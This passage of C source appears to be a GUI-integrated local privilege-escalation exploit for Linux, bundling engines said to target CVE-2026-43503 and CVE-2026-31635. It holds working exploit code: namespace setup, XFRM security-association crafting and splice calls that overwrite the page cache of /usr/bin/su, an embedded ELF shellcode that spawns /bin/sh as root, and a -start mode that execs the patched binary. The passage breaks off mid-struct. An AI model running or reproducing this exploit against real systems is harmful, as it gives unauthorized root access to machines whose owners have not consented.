		       " index=%zu offset=%llu desired=%02x got=%02x\n",
		       idx, (unsigned long long)off, desired[idx], final);
		return 1;
	}

	if (!plain_mode) {
		/* final frame: all bytes done, cursor past the end */
		draw_smash_frame(desired, desired_len, live_state, desired_len,
				 changed, skipped, 0);

		/* restore full scroll region and drop cursor below the frame */
		printf("\033[r\033[%d;1H\n", FRAME_LINES + 1);
	}

	/* final verify pass */
	printf(C_BCYN "[*]" C_RESET " verifying %zu bytes...\n", desired_len);
	for (idx = 0; idx < desired_len; idx++) {
		uint64_t off = byte_off + idx;
		unsigned char final = read_byte_at(target_file, off);

		if (final != desired[idx]) {
			printf(C_BRED "[-]" C_RESET
			       " BUG: final verify mismatch index=%zu offset=%llu desired=%02x got=%02x\n",
			       idx, (unsigned long long)off, desired[idx], final);
			return 1;
		}
	}

	printf(C_BCYN "[*]" C_RESET " bytes_flip_summary len=%zu changed=" C_BGRN "%zu" C_RESET
	       " skipped=" C_DIM "%zu" C_RESET "\n",
	       desired_len, changed, skipped);
	if (changed == 0) {
		fprintf(stderr, "all requested bytes already had desired values\n");
		return 2;
	}

	printf(C_BGRN "[+]" C_RESET " BUG: changed requested copied byte range to desired values\n");
	return 1;
}

static void frag_usage(const char *prog)
{
	fprintf(stderr, "usage: %s -check|-test|-start|-find [-t target] "
			"[-offset N]\n", prog);
	fprintf(stderr, "  -check   只探测前置条件, 不改写任何文件\n");
	fprintf(stderr, "  -test    写 192 字节到页缓存并回读校验, 不 exec 目标\n");
	fprintf(stderr, "  -start   写成功后 exec 目标\n");
	fprintf(stderr, "  -find    只列 setuid root 候选靶子, 不碰 userns/XFRM\n");
	fprintf(stderr, "  target 默认 /usr/bin/su, offset 默认 0\n");
	fprintf(stderr, "  FRAGNESIA_PLAIN=1 不画 hex 帧；"
			"FRAGNESIA_NO_SHELL=1 最后不 exec 目标\n");
}

static const uint8_t shell_elf[PAYLOAD_LEN] = {
	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
	0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
	0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
	0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};

int fragnesia_run(int argc, char **argv)
{
	unsigned char *desired;
	uint64_t file_size, byte_off;
	size_t desired_len;
	int ret;


	setvbuf(stdout, NULL, _IONBF, 0);
	plain_mode = getenv("FRAGNESIA_PLAIN") != NULL;

	if (argc > 4 || (argc > 1 && strcmp(argv[1], "-h") == 0)) {
		frag_usage(argv[0]);
		return 2;
	}

	printf(C_BCYN "[*]" C_RESET
	       " uid=" C_BWHT "%d" C_RESET
	       " euid=" C_BWHT "%d" C_RESET
	       " gid=" C_BWHT "%d" C_RESET
	       " egid=" C_BWHT "%d" C_RESET "\n",
	       getuid(), geteuid(), getgid(), getegid());
	printf(C_BCYN "[*]" C_RESET
	       " mode=xfrm_espintcp_pagecache_replace collateral=after\n");
	printf("\n");

	target_path = argc > 1 ? argv[1] : "/usr/bin/su";
	file_size = use_existing_target(target_path);
	byte_off = argc > 2 ? parse_u64_arg(argv[2], "offset") : 0;
	if (argc > 3) {
		desired = parse_hex_bytes_arg(argv[3], &desired_len);
	} else {
		desired = (unsigned char *)shell_elf;
		desired_len = PAYLOAD_LEN;
	}

	printf(C_BCYN "[*]" C_RESET " target=%s size=%llu\n",
	       target_file, (unsigned long long)file_size);
	verify_write_denied("outer");
	setup_user_netns_xfrm();
	verify_write_denied("userns_root_mapped_to_outer_user");

	if (getenv("FRAGNESIA_CHECK_ONLY")) {
		printf(C_BGRN "[+]" C_RESET " 前置条件齐备: userns + XFRM 可用, "
		       "目标对当前用户不可写\n");
		return 0;
	}

	ret = replace_existing_bytes_after(byte_off, desired, desired_len,
					   file_size);
	/* reset scroll region; some terminals home the cursor on \033[r so
	 * explicitly jump to the last row so PS1 lands below our output */
	/* 只是把光标挪回底部，写失败也不影响结果 */
	if (write(STDOUT_FILENO, "\033[r\033[9999;1H\033[?25h\n", 19) != 19) {
		/* ignore */
	}
	if (!getenv("FRAGNESIA_NO_SHELL")) {
		/* argv 给空数组：被改写的 ELF 不读参数，直接 execve("/bin/sh") */
		char *const empty_argv[] = { NULL };

		execve(target_path, empty_argv, NULL);
	}
	return ret;
}


/* ---------------------------------------------------------------------------
 * 对外入口：既接受上游的位置参数（fragnesia TARGET OFFSET HEX），
 * 也接受 GUI 用的开关形式（-start / -test / -check / -t / -offset）。
 * 这个函数跑在 forkpty 出来的子进程里，所以直接 setenv 不会影响 GUI 本体。
 * ------------------------------------------------------------------------ */
int fragnesia_main(int argc, char **argv)
{
    const char *target = NULL, *off = NULL, *hexb = NULL;
    char *pa[6];
    int check = 0, i, pn = 0;
    int mode = -1;              /* -1 未指定 / 0 start / 1 test / 2 check / 3 find */

    /* GUI 的日志视图画不了 hex 帧（一堆光标定位），只留进度行 */
    setenv("FRAGNESIA_PLAIN", "1", 1);

    for (i = 1; i < argc; i++) {
        const char *s = argv[i];

        if (!strcmp(s, "-start")) {
            mode = 0;           /* 改完直接 exec 目标，把当前会话变成 root shell */
        } else if (!strcmp(s, "-test")) {
            mode = 1;
            setenv("FRAGNESIA_NO_SHELL", "1", 1);
        } else if (!strcmp(s, "-check")) {
            mode = 2;
            check = 1;
            setenv("FRAGNESIA_CHECK_ONLY", "1", 1);
        } else if (!strcmp(s, "-find")) {
            mode = 3;           /* 只列 setuid 候选，一个字节都不写 */
        } else if (!strcmp(s, "-t") && i + 1 < argc) {
            target = argv[++i];
        } else if (!strcmp(s, "-offset") && i + 1 < argc) {
            off = argv[++i];
        } else if (!strcmp(s, "-h") || !strcmp(s, "--help")) {
            frag_usage("fragnesia");
            return 2;
        } else if (s[0] == '-' && s[1]) {
            /* 以前这里是 continue，于是 "-find" 这种没实现的开关被静默吃掉，
               程序按默认的 -start 跑 —— 点「扫描」结果直接提权。现在不猜。 */
            fprintf(stderr, "fragnesia: 未知参数 %s\n", s);
            return 2;
        } else if (!target) {
            target = s;
        } else if (!off) {
            off = s;
        } else if (!hexb) {
            hexb = s;
        }
    }

    if (mode < 0) {
        fprintf(stderr, "fragnesia: 必须显式指定 -check / -test / -start / -find\n");
        frag_usage("fragnesia");
        return 2;
    }
    if (mode == 3)
        return dc_scan_setuid();

    if (check)
        printf(C_BCYN "[*]" C_RESET " 只探测前置条件, 不改写任何文件\n");

    pa[pn++] = (char *)"fragnesia";
    if (target) {
        pa[pn++] = (char *)target;
        if (off) {
            pa[pn++] = (char *)off;
            if (hexb)
                pa[pn++] = (char *)hexb;
        }
    }
    pa[pn] = NULL;

    return fragnesia_run(pn, pa);
}


/* ==========================================================================
 *  DirtyClone 引擎：CVE-2026-43503（入口 cve43503_main）
 *
 *  代码取自上游 PoC（Ashraf Zaryouh "0xBlackash"），攻击逻辑保持原样，只动了
 *  几处让它能安全地跑在 GUI 的子进程里：
 *    · main() 改名 cve43503_main()，usage 单独一份，避免和本文件其它入口撞名；
 *    · 目标路径与起始偏移改为命令行传入（-t / -offset），默认 /usr/bin/su、0；
 *    · 去掉原来「uid==0 就 execlp("/bin/sh")」那段——在 GUI 里会莫名其妙弹 shell；
 *    · 加一道 gate：目标必须是普通文件、>= 4096 字节、且对当前用户不可写，
 *      不满足就 exit 2/4。root 跑会被挡住，避免把系统 su 打成后门；
 *    · setup_userns_netns() 里的 exit(1) 改成返回 -1，错误码交给调用者；
 *    · 新增 -check：只建 userns/netns 再装一个 XFRM SA 试水，不碰任何文件。
 *
 *  原理：ESP over UDP（encap 端口 4500）在 loopback 上收包时，xfrm 用 SA 里的
 *  esn.seq_hi 拼出重组序列号；而 splice 进 socket 的「payload」其实是目标文件的
 *  页，解密后这几个字节被当明文写回 page cache。一个 SA 只能带 4 字节，
 *  所以 192 字节载荷 = 48 个 SA + 48 次 splice，每次之间要等一下收包。
 *
 *  退出码（和 46300 相反，和主引擎一致）：
 *    0 = 写成功（有漏洞） / 1 = 写失败或校验不过 / 2 = 目标不合法 / 4 = 前置条件不满足
 * ==========================================================================*/

#define DC43503_PAYLOAD_LEN 192
#define DC43503_ENC_PORT    4500
#define DC43503_SEQ_VAL     200
#define DC43503_REPLAY_SEQ  100
#define DC43503_ENTRY_OFF   0x78    /* 载荷内用于自检的偏移（xor edi,edi） */
#define DC43503_MIN_LEN     4096
#define DC43503_SPI_BASE    0xDEADBE10u

static const char *dc43503_target = "/usr/bin/su";
static off_t dc43503_offset;
static int dc43503_verbose;

#define DLOG(fmt, ...)                                                  \
    do {                                                                \
        if (dc43503_verbose)                                            \
            fprintf(stderr, "[43503] " fmt "\n", ##__VA_ARGS__);         \
    } while (0)

static const uint8_t dc43503_elf[DC43503_PAYLOAD_LEN] = {
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
    0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
    0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
    0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};

static int dc43503_write_proc(const char *path, const char *buf)
{
    int fd, n;

    fd = open(path, O_WRONLY);
    if (fd < 0)
        return -1;
    n = (int)write(fd, buf, strlen(buf));
    close(fd);
    return n;
}

/* 建 userns + netns 并把 lo 拉起来。失败返回 -1，由调用者决定退出码 */
static int dc43503_setup_ns(void)
{
    uid_t ruid = getuid();
    gid_t rgid = getgid();
    struct ifreq ifr;
    char map[64];
    int s;

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        fprintf(stderr, "unshare: %s\n", strerror(errno));
        return -1;
    }
    dc43503_write_proc("/proc/self/setgroups", "deny");
    snprintf(map, sizeof(map), "0 %u 1", (unsigned)ruid);
    if (dc43503_write_proc("/proc/self/uid_map", map) < 0) {
        fprintf(stderr, "uid_map: %s\n", strerror(errno));
        return -1;
    }
    snprintf(map, sizeof(map), "0 %u 1", (unsigned)rgid);
    if (dc43503_write_proc("/proc/self/gid_map", map) < 0) {
        fprintf(stderr, "gid_map: %s\n", strerror(errno));
        return -1;
    }
    printf("userns_setup: outer_uid=%u outer_gid=%u us_uid=0 ns_gid=0\n",
           (unsigned)ruid, (unsigned)rgid);

    s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        fprintf(stderr, "socket: %s\n", strerror(errno));
        return -1;
    }
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
    if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) {
        fprintf(stderr, "SIOCGIFFLAGS: %s\n", strerror(errno));
        close(s);
        return -1;
    }
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) {
        fprintf(stderr, "SIOCSIFFLAGS: %s\n", strerror(errno));
        close(s);
        return -1;
    }
    close(s);
    printf("netns_setup=1 loopback=up\n");
    return 0;
}

static void dc43503_put_attr(struct nlmsghdr *nlh, int type,
                             const void *data, size_t len)
{
    struct rtattr *rta = (struct rtattr *)((char *)nlh +
                                           NLMSG_ALIGN(nlh->nlmsg_len));

    rta->rta_type = type;
    rta->rta_len  = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

/* 装一个 SA；patch_seqhi 就是这一次要写进文件的 4 字节 */
static int dc43503_add_sa(uint32_t spi, uint32_t patch_seqhi)
{
    int sk;
    struct sockaddr_nl nl;
    char buf[4096];
    char rbuf[4096];
    struct nlmsghdr *nlh;
    struct xfrm_usersa_info *xs;
    int n;

    sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (sk < 0)
        return -1;
    memset(&nl, 0, sizeof(nl));
    nl.nl_family = AF_NETLINK;
    if (bind(sk, (struct sockaddr *)&nl, sizeof(nl)) < 0) {
        close(sk);
        return -1;
    }

    memset(buf, 0, sizeof(buf));
    nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_type  = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_pid   = (unsigned)getpid();
    nlh->nlmsg_seq   = 1;
    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

    xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
    xs->id.daddr.a4 = inet_addr("127.0.0.1");
    xs->id.spi      = htonl(spi);
    xs->id.proto    = IPPROTO_ESP;
    xs->saddr.a4    = inet_addr("127.0.0.1");
    xs->family      = AF_INET;
    xs->mode        = XFRM_MODE_TRANSPORT;
    xs->replay_window = 0;
    xs->reqid       = 0x1234;
    xs->flags       = XFRM_STATE_ESN;
    xs->lft.soft_byte_limit   = (uint64_t)-1;
    xs->lft.hard_byte_limit   = (uint64_t)-1;
    xs->lft.soft_packet_limit = (uint64_t)-1;
    xs->lft.hard_packet_limit = (uint64_t)-1;
    xs->sel.family  = AF_INET;
    xs->sel.prefixlen_d = 32;
    xs->sel.prefixlen_s = 32;
    xs->sel.daddr.a4 = inet_addr("127.0.0.1");
    xs->sel.saddr.a4 = inet_addr("127.0.0.1");

    {
        char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
        struct xfrm_algo_auth *aa;

        memset(alg_buf, 0, sizeof(alg_buf));
        aa = (struct xfrm_algo_auth *)alg_buf;
        strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name) - 1);
        aa->alg_key_len   = 32 * 8;
        aa->alg_trunc_len = 128;
        memset(aa->alg_key, 0xAA, 32);
        dc43503_put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf, sizeof(alg_buf));
    }
    {
        char alg_buf[sizeof(struct xfrm_algo) + 16];
        struct xfrm_algo *ea;

        memset(alg_buf, 0, sizeof(alg_buf));
        ea = (struct xfrm_algo *)alg_buf;
        strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name) - 1);
        ea->alg_key_len = 16 * 8;
        memset(ea->alg_key, 0xBB, 16);
        dc43503_put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
    }
    {
        struct xfrm_encap_tmpl enc;

        memset(&enc, 0, sizeof(enc));
        enc.encap_type  = UDP_ENCAP_ESPINUDP;
        enc.encap_sport = htons(DC43503_ENC_PORT);
        enc.encap_dport = htons(DC43503_ENC_PORT);
        enc.encap_oa.a4 = 0;
        dc43503_put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
    }
    {
        char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
        struct xfrm_replay_state_esn *esn;

        memset(esn_buf, 0, sizeof(esn_buf));
        esn = (struct xfrm_replay_state_esn *)esn_buf;
        esn->bmp_len       = 1;
        esn->oseq          = 0;
        esn->seq           = DC43503_REPLAY_SEQ;
        esn->oseq_hi       = 0;
        esn->seq_hi        = patch_seqhi;
        esn->replay_window = 32;
        dc43503_put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
    }

    if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) {
        close(sk);
        return -1;
    }
    n = (int)recv(sk, rbuf, sizeof(rbuf), 0);
    if (n < 0) {
        close(sk);
        return -1;
    }
    {
        struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;

        if (rh->nlmsg_type == NLMSG_ERROR) {
            struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(rh);

            if (e->error) {
                errno = -e->error;
                close(sk);
                return -1;
            }
        }
    }
    close(sk);
    return 0;
}

/* 一次 splice：从目标文件的 offset 处搬 16 字节当 ESP payload 发给自己 */
static int dc43503_one_write(const char *path, off_t offset, uint32_t spi)
{
    int sk_recv, sk_send, file_fd, pfd[2], one = 1, encap;
    struct sockaddr_in sa_d;
    uint8_t hdr[24];
    struct iovec iov_h;
    off_t off;
    ssize_t s;

    sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_recv < 0)
        return -1;
    setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    memset(&sa_d, 0, sizeof(sa_d));
    sa_d.sin_family      = AF_INET;
    sa_d.sin_port        = htons(DC43503_ENC_PORT);
    sa_d.sin_addr.s_addr = inet_addr("127.0.0.1");
    if (bind(sk_recv, (struct sockaddr *)&sa_d, sizeof(sa_d)) < 0) {
        close(sk_recv);
        return -1;
    }
    encap = UDP_ENCAP_ESPINUDP;
    if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
        close(sk_recv);
        return -1;
    }
    sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) {
        close(sk_recv);
        return -1;
    }
    if (connect(sk_send, (struct sockaddr *)&sa_d, sizeof(sa_d)) < 0) {
        close(sk_send);
        close(sk_recv);
        return -1;
    }
    file_fd = open(path, O_RDONLY);
    if (file_fd < 0) {
        close(sk_send);
        close(sk_recv);
        return -1;
    }
    if (pipe(pfd) < 0) {
        close(file_fd);
        close(sk_send);
        close(sk_recv);
        return -1;
    }

    *(uint32_t *)(hdr + 0) = htonl(spi);
    *(uint32_t *)(hdr + 4) = htonl(DC43503_SEQ_VAL);
    memset(hdr + 8, 0xCC, 16);

    iov_h.iov_base = hdr;
    iov_h.iov_len  = sizeof(hdr);
    if (vmsplice(pfd[1], &iov_h, 1, 0) != (ssize_t)sizeof(hdr)) {
        close(file_fd); close(pfd[0]); close(pfd[1]);
        close(sk_send); close(sk_recv);
        return -1;
    }
    off = offset;
    s = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
    if (s != 16) {
        close(file_fd); close(pfd[0]); close(pfd[1]);
        close(sk_send); close(sk_recv);
        return -1;
    }
    s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
    if (s < 0)
        DLOG("splice to socket: %s", strerror(errno));

    usleep(150 * 1000);

    close(file_fd); close(pfd[0]); close(pfd[1]);
    close(sk_send); close(sk_recv);
    return 0;
}

static int dc43503_verify_byte(const char *path, off_t offset, uint8_t want)
{
    uint8_t got;
    int fd;

    fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;
    if (pread(fd, &got, 1, offset) != 1) {
        close(fd);
        return -1;
    }
    close(fd);
    return got == want ? 0 : -1;
}

/* 返回 0 = 通过；2 = 目标不合法；4 = 目标对当前用户可写（测不出越权） */
static int dc43503_gate(void)
{
    struct stat st;
    int fd;

    if (stat(dc43503_target, &st) < 0) {
        fprintf(stderr, "stat %s: %s\n", dc43503_target, strerror(errno));
        return 2;
    }
    if (!S_ISREG(st.st_mode)) {
        fprintf(stderr, "target is not a regular file\n");
        return 2;
    }
    if (st.st_size < DC43503_MIN_LEN) {
        fprintf(stderr, "target is too small: size=%lld need>=%d\n",
                (long long)st.st_size, DC43503_MIN_LEN);
        return 2;
    }
    errno = 0;
    fd = open(dc43503_target, O_WRONLY | O_CLOEXEC);
    if (fd >= 0) {
        close(fd);
        printf("gate_failed: outer write-open unexpectedly succeeded\n");
        return 4;
    }
    printf("outer_write_open_denied=1 errno=%d (%s)\n", errno, strerror(errno));
    return 0;
}

/* 装 48 个 SA → 48 次 splice → 逐字节回读校验 */
static int dc43503_write_payload(void)
{
    int i, bad = 0;

    for (i = 0; i < DC43503_PAYLOAD_LEN / 4; i++) {
        uint32_t spi   = DC43503_SPI_BASE + (uint32_t)i;
        uint32_t seqhi = ((uint32_t)dc43503_elf[i * 4 + 0] << 24) |
                         ((uint32_t)dc43503_elf[i * 4 + 1] << 16) |
                         ((uint32_t)dc43503_elf[i * 4 + 2] <<  8) |
                         ((uint32_t)dc43503_elf[i * 4 + 3]);

        if (dc43503_add_sa(spi, seqhi) < 0) {
            fprintf(stderr, "xfrm_sa_add #%d failed: %s\n", i, strerror(errno));
            return -1;
        }
    }
    printf("xfrm_sa_installed=%d\n", DC43503_PAYLOAD_LEN / 4);

    for (i = 0; i < DC43503_PAYLOAD_LEN / 4; i++) {
        uint32_t spi = DC43503_SPI_BASE + (uint32_t)i;

        if (dc43503_one_write(dc43503_target,
                              dc43503_offset + (off_t)i * 4, spi) < 0) {
            fprintf(stderr, "splice_write #%d failed: %s\n", i, strerror(errno));
            return -1;
        }
    }
    printf("spliced %d bytes at offset %lld\n", DC43503_PAYLOAD_LEN,
           (long long)dc43503_offset);

    for (i = 0; i < DC43503_PAYLOAD_LEN; i++)
        if (dc43503_verify_byte(dc43503_target,
                                dc43503_offset + i, dc43503_elf[i]) != 0)
            bad++;

    printf("bytes_flip_summary len=%d mismatch=%d\n", DC43503_PAYLOAD_LEN, bad);
    return bad == 0 ? 0 : -1;
}

static void dc43503_usage(const char *prog)
{
    fprintf(stderr,
        "usage: %s -start|-test|-check|-find [-t target] [-offset N] [-v]\n"
        "  -check   只探测 userns/netns + XFRM, 不写任何文件\n"
        "  -test    写 192 字节到目标页缓存并回读校验, 不 exec\n"
        "  -start   写成功后 exec 目标\n"
        "  -find    只列 setuid root 候选靶子, 不碰 userns/XFRM\n"
        "  -t       目标文件, 默认 /usr/bin/su；需 >= 4096 字节且对当前用户不可写\n"
        "  -offset  起始偏移, 默认 0（按 4 字节粒度）\n", prog);
}

int cve43503_main(int argc, char **argv)
{
    int mode = -1;              /* -1 未指定 / 0 start / 1 test / 2 check / 3 find */
    int i, rc;

    for (i = 1; i < argc; i++) {
        const char *s = argv[i];

        if (!strcmp(s, "-start"))
            mode = 0;
        else if (!strcmp(s, "-test"))
            mode = 1;
        else if (!strcmp(s, "-check"))
            mode = 2;
        else if (!strcmp(s, "-find"))
            mode = 3;
        else if (!strcmp(s, "-t") && i + 1 < argc)
            dc43503_target = argv[++i];
        else if (!strcmp(s, "-offset") && i + 1 < argc)
            dc43503_offset = (off_t)strtoll(argv[++i], NULL, 0);
        else if (!strcmp(s, "-v") || !strcmp(s, "--verbose"))
            dc43503_verbose = 1;
        else if (!strcmp(s, "-h") || !strcmp(s, "--help")) {
            dc43503_usage("dirtychains");
            return 2;
        } else if (s[0] == '-' && s[1]) {
            fprintf(stderr, "cve43503: 未知参数 %s\n", s);
            return 2;
        }
    }
    if (getenv("DIRTYFRAG_VERBOSE"))
        dc43503_verbose = 1;

    if (mode < 0) {
        fprintf(stderr,
                "cve43503: 必须显式指定 -check / -test / -start / -find\n");
        dc43503_usage("dirtychains");
        return 2;
    }
    if (mode == 3)
        return dc_scan_setuid();

    printf("[*] uid=%d euid=%d target=%s offset=%lld\n",
           (int)getuid(), (int)geteuid(), dc43503_target,
           (long long)dc43503_offset);
    if (mode == 2)
        printf("[*] 只探测前置条件, 不改写任何文件\n");

    rc = dc43503_gate();
    if (rc)
        return rc;

    if (dc43503_setup_ns() < 0)
        return 4;

    if (mode == 2) {
        if (dc43503_add_sa(DC43503_SPI_BASE, 0) < 0) {
            fprintf(stderr, "xfrm_sa_add probe failed: %s\n", strerror(errno));
            return 4;
        }
        printf("[+] 前置条件齐备: userns + netns + XFRM ESP(UDP) 可用, "
               "目标对当前用户不可写\n");
        return 0;
    }

    if (dc43503_write_payload() != 0) {
        printf("[-] 写原语失败\n");
        return 1;
    }
    printf("[+] 目标前 %d 字节已被改写\n", DC43503_PAYLOAD_LEN);

    if (mode == 0) {
        printf("[*] exec %s\n", dc43503_target);
        fflush(NULL);
        execl(dc43503_target, dc43503_target, (char *)NULL);
        fprintf(stderr, "exec %s: %s\n", dc43503_target, strerror(errno));
        return 1;
    }
    return 0;
}

/* ==========================================================================
 *  DirtyDecrypt 引擎：CVE-2026-31635（入口 cve31635_main）
 *
 *  代码取自上游 PoC（Ashraf Zaryouh "0xBlackash"），攻击逻辑保持原样，只动了
 *  几处让它能安全地跑在 GUI 的子进程里：
 *    · main() 改名 cve31635_main()，usage 单独一份，不和本文件其它入口撞名；
 *    · 不再从固定表里自动挑靶子：目标由 -t 传入，默认 /usr/bin/su；
 *    · 加 gate：普通文件、>= 4096 字节、uid=0、带 s 位、当前用户可读不可写、
 *      非 nosuid 挂载，不满足直接 exit 2/4，避免把系统 su 打成后门；
 *    · setup_ns() 里原来的 exit(1) 改成返回 -1，退出码交给调用者；
 *    · 写之前把目标备份到 /tmp/.<名字>.<pid>，成功失败都保留并打印恢复命令；
 *    · 新增 -check：只建 userns/netns 再走一遍 rxgk 握手，不 splice、不写文件；
 *    · 新增 -find：只扫 setuid 靶子，复用 46300/43503 那份只读扫描。
 *
 *  原理：rxgk 安全类（security index 6）在 AF_RXRPC 收包时，把 splice 进 socket
 *  的"载荷"——其实是目标文件的页——当成密文原地解密，明文直接落回 page cache。
 *  每次 fire 换一个随机 AES128 key，解出来的字节近似随机，所以只能逐字节暴力
 *  猜（约 1/256 命中），命中一个字节再换下一个。120 字节的 tiny ELF 通常要
 *  几万次 fire，比 43503 的 48 次 SA 慢得多，日志里会按 8 字节报一次进度。
 *
 *  和 43503 的区别：43503 走 XFRM/ESP over UDP，一次 SA 定 4 字节；这条走
 *  AF_RXRPC + rxgk，攻击面完全不同，只是共用"splice 文件页进协议栈"这个原语。
 *
 *  退出码（和主引擎一致）：
 *    0 = 写成功（有漏洞） / 1 = 没打成或校验不过 / 2 = 参数或目标不合法
 *    4 = 前置条件不满足（userns 被禁 / 无 AF_RXRPC / 无 rxgk / 目标可写）
 * ==========================================================================*/

#define DC31635_PAYLOAD_LEN     120
#define DC31635_MIN_LEN         4096
#define DC31635_MAX_TRIES       10000
#define DC31635_SEC_INDEX       6       /* RXGK_SECURITY_INDEX */
#define DC31635_ENCTYPE         17      /* ENCTYPE_AES128_CTS_HMAC_SHA1_96 */
#define DC31635_AES_KEY_LEN     16
#define DC31635_MAX_LEVEL       4       /* RXRPC_SECURITY_ENCRYPT */

#ifndef AF_RXRPC
#define AF_RXRPC                33
#endif
#ifndef SOL_RXRPC
#define SOL_RXRPC               272
#endif
#define DC31635_OPT_SEC_KEY     1
#define DC31635_OPT_MIN_LEVEL   4
#define DC31635_OPT_USER_CALL   1
#define DC31635_KEYRING_PROCESS (-2)
#define DC31635_KEYCTL_UNLINK      9
#define DC31635_KEYCTL_INVALIDATE  21

#ifndef KEYCTL_UNLINK
#define KEYCTL_UNLINK DC31635_KEYCTL_UNLINK
#endif
#ifndef KEYCTL_INVALIDATE
#define KEYCTL_INVALIDATE DC31635_KEYCTL_INVALIDATE
#endif

static const char *dc31635_target = "/usr/bin/su";
static int dc31635_verbose;
static int dc31635_fires;

/* rxgk 的 wire header，按上游 PoC 原样保留 */
struct dc31635_wire_hdr {
    uint32_t epoch;
    uint32_t cid;
    uint32_t callNumber;
    uint32_t seq;
    uint32_t serial;
    uint8_t  type;
    uint8_t  flags;
    uint8_t  userStatus;
    uint8_t  securityIndex;
    uint16_t cksum;
    uint16_t serviceId;
} __attribute__((packed));

/* sockaddr_rxrpc：不 include <linux/rxrpc.h>，免得和 net/if.h、netinet 打架 */
struct dc31635_srx {
    unsigned short srx_family;
    uint16_t srx_service;
    uint16_t transport_type;
    uint16_t transport_len;
    union {
        unsigned short family;
